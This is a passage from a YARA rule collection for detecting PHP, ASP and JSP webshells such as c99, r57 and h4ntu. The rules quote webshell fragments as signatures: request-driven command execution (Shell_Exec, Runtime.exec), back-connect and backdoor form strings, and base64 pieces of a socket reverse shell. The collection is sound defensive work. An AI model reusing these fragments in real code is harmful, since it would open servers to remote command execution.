        hash = "b815611cc39f17f05a73444d699341d4"

    strings:
        $s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
        $s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
        $s2 = "cmdjsp.jsp"
        $s3 = "michaeldaw.org" fullword
    condition:
        2 of them
}
rule h4ntu_shell__powered_by_tsoi_ {
    meta:
        id = "2Sb0PnbHg4PT4JTvsDy5yw"
        fingerprint = "v1_sha256_32c620a4ed3f7a8640928e2211516978c12cfbdedb7d96e923303740407b5a1c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
        category = "INFO"
        hash = "06ed0b2398f8096f1bebf092d0526137"

    strings:
        $s0 = "h4ntu shell"
        $s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
    condition:
        1 of them
}
rule Ajan_asp {
    meta:
        id = "9gXO9BzqDssI9NCnVJ4E8"
        fingerprint = "v1_sha256_13988af864a62ca04501288d4f2d830815ab453b14cef6795fe993db1dd1a9ef"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Ajan.asp.txt"
        category = "INFO"
        hash = "b6f468252407efc2318639da22b08af0"

    strings:
        $s1 = "c:\\downloaded.zip"
        $s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
        $s3 = "http://www35.websamba.com/cybervurgun/"
    condition:
        1 of them
}
rule PHANTASMA_php {
    meta:
        id = "1SmpARqRkq2Aja28M9mn6g"
        fingerprint = "v1_sha256_d4a2a1bcc1ff3264b35f2b05d7de664b56807977f2a793fd87206f046a185d3b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
        category = "INFO"
        hash = "52779a27fa377ae404761a7ce76a5da7"

    strings:
        $s0 = ">[*] Safemode Mode Run</DIV>"
        $s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
        $s2 = "[*] Spawning Shell"
        $s3 = "Cha0s"
    condition:
        2 of them
}
rule MySQL_Web_Interface_Version_0_8_php {
    meta:
        id = "aXJWPas74DW2RUYRMpQqU"
        fingerprint = "v1_sha256_f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
        category = "INFO"
        hash = "36d4f34d0a22080f47bb1cb94107c60f"

    strings:
        $s0 = "SooMin Kim"
        $s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
        $s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
        $s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
    condition:
        2 of them
}
rule simple_cmd_html {
    meta:
        id = "2clK7gdrdLLxOORD5jaMDt"
        fingerprint = "v1_sha256_56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file simple_cmd.html.txt"
        category = "INFO"
        hash = "c6381412df74dbf3bcd5a2b31522b544"

    strings:
        $s1 = "<title>G-Security Webshell</title>" fullword
        $s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
        $s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
        $s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
    condition:
        all of them
}
rule _1_c2007_php_php_c100_php {
    meta:
        id = "4IJbdxLtbPwaW9ICAdKgK7"
        fingerprint = "v1_sha256_6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
        hash1 = "d089e7168373a0634e1ac18c0ee00085"
        hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

    strings:
        $s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
        $s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
    condition:
        1 of them
}
rule _nst_php_php_img_php_php_nstview_php_php {
    meta:
        id = "4aJmAK2ywsUAh9lAcpu898"
        fingerprint = "v1_sha256_b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
        hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
        hash2 = "4745d510fed4378e4b1730f56f25e569"

    strings:
        $s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
        $s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
        $s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
    condition:
        1 of them
}
rule _network_php_php_xinfo_php_php_nfm_php_php {
    meta:
        id = "6stxJCf3N3OGej1lYrj4Kg"
        fingerprint = "v1_sha256_913ff19b6448d3b074440c2a5f85d85813fdf010d33dc57c89ba1e5db6455e11"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
        hash1 = "2601b6fc1579f263d2f3960ce775df70"
        hash2 = "401fbae5f10283051c39e640b77e4c26"

    strings:
        $s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
        $s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
    condition:
        all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php {
    meta:
        id = "6lGuuKxPElMB74NMy2CRIa"
        fingerprint = "v1_sha256_a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
        $s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
    condition:
        1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
    meta:
        id = "1Go2XRN3LLvIN3fAbaruBW"
        fingerprint = "v1_sha256_0df3e00f752f85aa1f150c01e3ef41b9a5cd3d3ce2060965992320cb3c4d87ae"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "911195a9b7c010f61b66439d9048f400"
        hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
        hash3 = "8023394542cddf8aee5dec6072ed02b5"
        hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash5 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
        $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
    condition:
        1 of them
}
rule _c99shell_v1_0_php_php_c99php_SsEs_php_php_ctt_sh_php_php {
    meta:
        id = "4PfiFSSVP640sChamDyUYd"
        fingerprint = "v1_sha256_137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
        hash3 = "671cad517edd254352fe7e0c7c981c39"

    strings:
        $s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
        $s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
        $s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
    condition:
        2 of them
}
rule _r577_php_php_spy_php_php_s_php_php {
    meta:
        id = "10uUOEEw1sAQOwmjBVmenu"
        fingerprint = "v1_sha256_09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash2 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
        $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
    condition:
        1 of them
}
rule webshell_c99_generic {
    meta:
        id = "2TIrk3WAq4AOXrYi2JR4jw"
        fingerprint = "v1_sha256_422bc3a0d9b04b1e37ad954faacb1ec7841fe529c1eb19634bdbfe83da374c73"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash5 = "09609851caa129e40b0d56e90dfc476c"
        hash6 = "671cad517edd254352fe7e0c7c981c39"

    strings:
        $s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
        $s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
        $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
        $s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
    condition:
        all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
    meta:
        id = "5qc2MMG2wlMxqfQo52rh5W"
        fingerprint = "v1_sha256_b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
        hash5 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "$sess_data[\"cut\"] = array(); c99_s"
        $s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
    condition:
        1 of them
}
rule _w_php_php_wacking_php_php_SpecialShell_99_php_php {
    meta:
        id = "6QNzDaZluYwLnCv4PE31xA"
        fingerprint = "v1_sha256_7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "9c5bb5e3a46ec28039e8986324e42792"
        hash2 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
        $s2 = "c99sh_sqlquery"
    condition:
        1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
    meta:
        id = "2pzRaZdTijn10T8SkVL1as"
        fingerprint = "v1_sha256_6dbd40e19d4d5753dbd1f7e627bccc08a60430de8138a923f13e836d19dde65c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
        hash4 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
        $s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
    condition:
        1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php {
    meta:
        id = "1n2IfGHcNf2gtaRWRgOWu2"
        fingerprint = "v1_sha256_834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "911195a9b7c010f61b66439d9048f400"
        hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
        hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash4 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
        $s1 = ".$arrow.\"</b>\",in('text','"
    condition:
        2 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php {
    meta:
        id = "WgM0IKP1fREfGVhbAR4D5"
        fingerprint = "v1_sha256_f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "911195a9b7c010f61b66439d9048f400"
        hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

    strings:
        $s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
        $s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
        $s2 = "rst.void.ru"
    condition:
        3 of them
}
rule _r577_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
    meta:
        id = "3tnZlUgAwPASdmmdLE6Q7L"
        fingerprint = "v1_sha256_764a374c1e4acec8978db1e7e7e326c4fa95c6f92e1ca5a6d7f892bb05ecd289"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "8023394542cddf8aee5dec6072ed02b5"
        hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash3 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s0 = "echo ws(2).$lb.\" <a"
        $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
        $s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
    condition:
        2 of them
}
rule _wacking_php_php_1_SpecialShell_99_php_php_c100_php {
    meta:
        id = "6QDsyyQbkMFPioVp34PVww"
        fingerprint = "v1_sha256_0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "9c5bb5e3a46ec28039e8986324e42792"
        hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
        hash2 = "09609851caa129e40b0d56e90dfc476c"
        hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

    strings:
        $s0 = "if(eregi(\"./shbd $por\",$scan))"
        $s1 = "$_POST['backconnectip']"
        $s2 = "$_POST['backcconnmsg']"
    condition:
        1 of them
}
rule _r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
    meta:
        id = "1DVaeHlphtTVM1YHwCNpyp"
        fingerprint = "v1_sha256_afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
        hash2 = "8023394542cddf8aee5dec6072ed02b5"
        hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash4 = "817671e1bdc85e04cc3440bbd9288800"

    strings:
        $s1 = "if(rmdir($_POST['mk_name']))"
        $s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
        $s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
    condition:
        2 of them
}
rule _w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
    meta:
        id = "4MopRimSAGWF33eSn9Yx9n"
        fingerprint = "v1_sha256_9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "9c5bb5e3a46ec28039e8986324e42792"
        hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
        hash3 = "09609851caa129e40b0d56e90dfc476c"

    strings:
        $s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
        $s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
        $s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
    condition:
        1 of them
}
rule _webadmin_php_php_iMHaPFtp_php_php_Private_i3lue_php {
    meta:
        id = "72sF5RuOx1Hasl1sjNg4PU"
        fingerprint = "v1_sha256_684cfb86702930e746ca0cb55582a85ae2ca58ea17d7c8cd12b4a1b450067c92"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files webadmin.php.php.txt, iMHaPFtp.php.php.txt, Private-i3lue.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "b268e6fa3bf3fe496cffb4ea574ec4c7"
        hash1 = "12911b73bc6a5d313b494102abcf5c57"
        hash2 = "13f5c7a035ecce5f9f380967cf9d4e92"

    strings:
        $s0 = "return $type . $owner . $group . $other;" fullword
        $s1 = "$owner  = ($mode & 00400) ? 'r' : '-';" fullword
    condition:
        all of them
}
rule multiple_php_webshells {
    meta:
        id = "90m4Rli2878axHvutatcI"
        fingerprint = "v1_sha256_d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files multiple_php_webshells"
        category = "INFO"
        super_rule = 1
        hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
        hash1 = "911195a9b7c010f61b66439d9048f400"
        hash2 = "be0f67f3e995517d18859ed57b4b4389"
        hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
        hash4 = "8023394542cddf8aee5dec6072ed02b5"
        hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
        hash6 = "817671e1bdc85e04cc3440bbd9288800"
        hash7 = "7101fe72421402029e2629f3aaed6de7"
        hash8 = "f618f41f7ebeb5e5076986a66593afd1"

    strings:
        $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
        $s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
        $s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
    condition:
        2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php {
    meta:
        id = "1MlshRsJooVDZIlSY1IMNf"
        fingerprint = "v1_sha256_c089f8175532ddc0e2d256b4972f7db32683bd213a456622ed27ab4844d1e435"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"

    strings:
        $s0 = "<b>Dumped! Dump has been writed to "
        $s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
        $s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
    condition:
        1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php {
    meta:
        id = "6Nlvk1UXN5JzvZF06KRSkQ"
        fingerprint = "v1_sha256_e82882e89a1aeb256768f2af7a6d3674c89f9abc358710b33b8d3d425defcef1"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
        hash1 = "3ca5886cd54d495dc95793579611f59a"
        hash2 = "9c5bb5e3a46ec28039e8986324e42792"
        hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
        hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"

    strings:
        $s0 = "@ini_set(\"highlight" fullword
        $s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
        $s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
    condition:
        2 of them
}
rule _GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php {
    meta:
        id = "40aGYavEgXK54ti8I1MRdU"
        fingerprint = "v1_sha256_9df5b6df25574b303044a0799c5eb5f38f9ebfbc6f6114275fe1e34adbde1f7c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
        category = "INFO"
        super_rule = 1
        hash0 = "be0f67f3e995517d18859ed57b4b4389"
